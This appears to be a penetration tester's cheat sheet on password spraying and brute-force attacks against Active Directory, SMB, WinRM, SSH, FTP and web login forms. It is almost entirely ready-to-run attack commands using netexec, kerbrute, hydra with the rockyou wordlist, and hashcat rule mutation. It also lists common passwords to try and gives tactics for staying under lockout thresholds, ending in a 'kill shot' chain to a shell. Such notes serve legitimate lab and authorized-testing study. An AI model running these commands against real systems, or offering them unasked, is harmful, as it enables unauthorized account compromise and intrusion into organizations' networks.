# 🔑 Password Spraying & Brute Force

> **Spray, don't brute, in AD:** one password × many users avoids lockout. Brute force (many passwords × one user) is for lockout-free services only. Always check the **lockout policy** first.

Part of [[Credential Attacks]]. Related: [[AD Enumeration]] · [[Finding Credentials]] · [[SMB]] · [[SSH]]

---

## 🧠 THINK
- **Check lockout before spraying** (`netexec smb $IP --pass-pol`) — one password per lockout window.
- **Spray** (1 pw → many users) for domains; **brute** (many pw → 1 user) only where there's no lockout (some web/SSH/FTP).
- Best test bench is **SMB** (`netexec` shows `(Pwn3d!)`). Always try any **found** password + mutations.

## ⚡ CHECK LOCKOUT FIRST
```bash
netexec smb $IP --pass-pol
```
```bash
rpcclient -U "" -N $IP -c "getdompwinfo"
```

## 💥 SPRAY (AD / SMB / services)
```bash
netexec smb $IP -u users.txt -p 'Season2024!' --continue-on-success
```
```bash
netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
```
```bash
netexec winrm $IP -u users.txt -p passwords.txt
```
```bash
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Welcome1'
```

## 💥 BRUTE (lockout-free targets only)
```bash
hydra -L users.txt -P passwords.txt ssh://$IP -t 4 -f
```
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```
```bash
hydra -L users.txt -P passwords.txt ftp://$IP -t 4
```

## 🎯 PASSWORDS TO ALWAYS TRY
`Password1`, `Password123`, `Welcome1`, `<Company>2024!`, `<Season><Year>!`, the **username itself**, `admin/admin`, product defaults, and **any found password** → mutated:
```bash
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule
```

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `(Pwn3d!)` | local admin → [[AD Lateral Movement]] |
| Valid cred (+) | authed enum + [[Credential Reuse]] |
| Cred works one host | test whole subnet ([[Credential Reuse]]) |
| Nothing hits | mutate found passwords; enumerate more users ([[Finding Credentials]]) |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Accounts locking | stop; 1 pw per window; check `--pass-pol` threshold |
| No valid creds | AS-REP roast (no creds), creds from other services, bigger userlist |
| Web brute rate-limited | slow threads; find creds elsewhere; default creds |
| Cred rejected everywhere | verify format/skew → [[Credentials Rejected]] |

## 📇 CHEAT SHEET
```bash
netexec smb $IP --pass-pol
```
```bash
netexec smb $IP -u users.txt -p 'Welcome1' --continue-on-success
```
```bash
hydra -L users.txt -P rockyou.txt ssh://$IP -t 4 -f
```
**Kill shot:** check lockout → spray common/found passwords → `(Pwn3d!)` → shell.
